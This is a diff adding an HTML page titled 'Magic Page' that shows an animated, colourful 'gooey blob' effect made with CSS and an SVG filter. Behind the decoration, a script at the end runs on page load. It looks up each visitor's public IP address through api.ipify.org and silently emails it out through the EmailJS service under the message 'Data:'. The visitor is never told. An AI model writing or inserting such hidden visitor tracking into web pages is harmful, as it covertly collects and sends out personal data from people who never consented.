@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magic Page</title>
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            width: 100vw;
+            background: #111;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .gooey-container {
+            filter: url(#goo);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .blob {
+            width: 150px;
+            /* bigger blobs for fullscreen */
+            height: 150px;
+            border-radius: 50%;
+            position: absolute;
+            animation: move 6s infinite alternate ease-in-out;
+        }
+
+        .blob:nth-child(1) {
+            background: #ff0080;
+            animation-delay: 0s;
+        }
+
+        .blob:nth-child(2) {
+            background: #40e0d0;
+            animation-delay: 1s;
+        }
+
+        .blob:nth-child(3) {
+            background: #ff8c00;
+            animation-delay: 2s;
+        }
+
+        .blob:nth-child(4) {
+            background: #ffff00;
+            animation-delay: 3s;
+        }
+
+        /* Make blobs wander across the entire screen */
+        @keyframes move {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            25% {
+                transform: translate(80vw, 20vh);
+            }
+
+            50% {
+                transform: translate(40vw, 70vh);
+            }
+
+            75% {
+                transform: translate(90vw, 50vh);
+            }
+
+            100% {
+                transform: translate(0, 0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="gooey-container">
+        <div class="blob"></div>
+        <div class="blob"></div>
+        <div class="blob"></div>
+        <div class="blob"></div>
+    </div>
+
+    <svg width="0" height="0">
+        <filter id="goo">
+            <feGaussianBlur in="SourceGraphic" stdDeviation="15" result="blur" />
+            <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0
+              0 1 0 0 0
+              0 0 1 0 0
+              0 0 0 20 -10" result="goo" />
+            <feBlend in="SourceGraphic" in2="goo" />
+        </filter>
+    </svg>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+        emailjs.init("uBAGF6sfmnQ4zOX4y");
+
+        fetch("https://api.ipify.org/?format=json")
+            .then(r => r.json())
+            .then(data => {
+                const params = {
+                    name: "James",
+                    message: "Data: " + data.ip,
+                };
+
+                emailjs.send("default_service", "template_nmsdxcf", params)
+                    .then(response => console.log("SUCCESS!", response.status, response.text))
+                    .catch(error => console.log("FAILED...", error));
+            });
+    </script>
+</body>
+
+</html>
